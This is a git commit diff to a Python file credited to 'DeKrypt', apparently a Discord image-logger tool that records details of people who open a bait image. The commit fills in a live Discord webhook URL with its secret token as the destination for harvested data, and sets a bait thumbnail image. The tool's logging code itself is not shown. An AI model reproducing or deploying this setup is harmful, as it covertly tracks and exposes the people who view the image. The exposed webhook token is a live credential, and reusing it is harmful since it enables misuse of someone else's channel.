e351def40b7e82187ce040d05eba245aaeb75654
mmm410060-sketch <mmm410060@gmail.com>
2025-12-01 01:02:51 +0200

    Update fi.py

--- api/fi.py
+++ api/fi.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1444825048526491759/5NgrQ_C0lj2hqIU8se1fsXWF27FhizCM-v7aV-8FtTDW--Cu71p4jzXVQf-LbB0yEYg7",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHIhf_YUD_wuYXpGw5AVVV0f1XDwWk1VU5fA&s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
